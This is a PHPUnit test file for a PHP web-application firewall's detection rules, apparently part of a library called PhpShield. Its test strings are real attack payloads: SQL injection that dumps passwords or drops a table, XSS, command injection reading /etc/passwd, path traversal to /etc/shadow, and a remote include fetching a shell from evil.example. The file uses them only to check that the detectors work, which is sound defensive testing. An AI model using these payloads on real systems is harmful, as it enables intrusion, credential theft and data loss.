<?php

declare(strict_types=1);

namespace Deynekin\PhpShield\Tests;

use Deynekin\PhpShield\Detection\CommandInjectionRule;
use Deynekin\PhpShield\Detection\FileInclusionRule;
use Deynekin\PhpShield\Detection\PathTraversalRule;
use Deynekin\PhpShield\Detection\SqlInjectionRule;
use Deynekin\PhpShield\Detection\SuspiciousHeaderRule;
use Deynekin\PhpShield\Detection\XssRule;
use PHPUnit\Framework\TestCase;

class DetectionRulesTest extends TestCase
{
    public function testSqlInjectionDetectsUnionSelect(): void
    {
        $rule = new SqlInjectionRule();
        $result = $rule->check("1' UNION SELECT username, password FROM users--", 'q');

        $this->assertTrue($result['matched']);
        $this->assertGreaterThanOrEqual(40, $result['score'] ?? 0);
        $this->assertSame('sql_injection', $result['pattern'] ?? '');
    }

    public function testSqlInjectionIgnoresNormalText(): void
    {
        $rule = new SqlInjectionRule();

        $this->assertFalse($rule->check('Please explain what a SELECT statement does', 'comment')['matched']);
        $this->assertFalse($rule->check('SELECT * FROM users WHERE id = 1', 'comment')['matched']);
    }

    public function testSqlInjectionDetectsStackedQuery(): void
    {
        $rule = new SqlInjectionRule();

        $this->assertTrue($rule->check("'; DROP TABLE users; --", 'q')['matched']);
    }

    public function testXssDetectsScriptTag(): void
    {
        $rule = new XssRule();
        $result = $rule->check('<script>alert(1)</script>', 'name');

        $this->assertTrue($result['matched']);
        $this->assertSame(90, $result['score'] ?? 0);
    }

    public function testXssDetectsEventHandler(): void
    {
        $rule = new XssRule();

        $this->assertTrue($rule->check('<img src=x onerror=alert(1)>', 'html')['matched']);
    }

    public function testXssIgnoresPlainMarkup(): void
    {
        $rule = new XssRule();

        $this->assertFalse($rule->check('Please review the <b>bold</b> markup', 'comment')['matched']);
    }

    public function testCommandInjection(): void
    {
        $rule = new CommandInjectionRule();

        $this->assertTrue($rule->check('test; cat /etc/passwd', 'input')['matched']);
        $this->assertTrue($rule->check('file | whoami', 'input')['matched']);
        $this->assertTrue($rule->check('`id`', 'input')['matched']);
        $this->assertTrue($rule->check('system("ls")', 'input')['matched']);
    }

    public function testCommandInjectionIgnoresBacktickedCodeWithoutCommand(): void
    {
        $rule = new CommandInjectionRule();

        $this->assertFalse($rule->check('Run `composer install` first', 'comment')['matched']);
        $this->assertFalse($rule->check('The `config` key is optional', 'comment')['matched']);
    }

    public function testPathTraversal(): void
    {
        $rule = new PathTraversalRule();

        $this->assertTrue($rule->check('../../etc/passwd', 'file')['matched']);
        $this->assertTrue($rule->check('/etc/shadow', 'file')['matched']);
        $this->assertTrue($rule->check('..\\..\\windows\\system32', 'file')['matched']);
    }

    public function testPathTraversalIgnoresNormalPaths(): void
    {
        $rule = new PathTraversalRule();

        $this->assertFalse($rule->check('/var/www/html/index.php', 'file')['matched']);
        $this->assertFalse($rule->check('../images/logo.png', 'file')['matched']);
    }

    public function testFileInclusion(): void
    {
        $rule = new FileInclusionRule();

        $this->assertTrue($rule->check('php://filter/read=convert.base64-encode/resource=index.php', 'page')['matched']);
        $this->assertTrue($rule->check('require("http://evil.example/shell.txt")', 'page')['matched']);
        $this->assertFalse($rule->check('include the configuration file', 'page')['matched']);
    }

    public function testSuspiciousHeader(): void
    {
        $rule = new SuspiciousHeaderRule();

        $this->assertTrue($rule->check('sqlmap/1.7.2#stable (https://sqlmap.org)', 'User-Agent')['matched']);
        $this->assertTrue($rule->check('Nikto/2.5.0', 'User-Agent')['matched']);
        $this->assertFalse(
            $rule->check('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'User-Agent')['matched']
        );
    }

    public function testDisabledRule(): void
    {
        $rule = new SqlInjectionRule(['enabled' => false]);
        $result = $rule->check("1' UNION SELECT 1--", 'q');

        $this->assertFalse($result['matched']);
        $this->assertFalse($rule->isEnabled());
    }

    public function testRulesDoNotMatchPercentEncodedPayloads(): void
    {
        // Documented limitation: rules work on decoded values. The middleware
        // decodes candidates before calling them (see SecurityMiddlewareTest).
        $rule = new XssRule();

        $this->assertFalse($rule->check('%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'q')['matched']);
    }
}
